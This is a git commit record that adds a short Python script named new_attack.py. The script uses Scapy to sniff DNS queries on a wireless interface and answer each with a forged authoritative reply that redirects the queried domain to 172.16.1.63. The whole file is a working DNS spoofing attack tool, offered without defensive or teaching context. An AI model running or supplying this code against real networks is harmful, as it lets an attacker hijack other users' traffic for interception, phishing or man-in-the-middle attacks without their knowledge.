6c25bbb4543c4cc322097b1e81dbccea9c3663f3
Aristide Muhizi <muhizia4@gmail.com>
2020-12-09 00:33:16 +0200

    Add files via upload

---
+++ new_attack.py
@@ -0,0 +1,11 @@
+from scapy.all import *
+def dns_spoof(pkt):
+    redirect_to = '172.16.1.63'
+    if pkt.haslayer(DNSQR): # DNS question record
+        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
+                      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
+        send(spoofed_pkt)
+        print 'Sent:', spoofed_pkt.summary()
+sniff(filter='udp port 53', iface='wlan0', store=0, prn=dns_spoof)
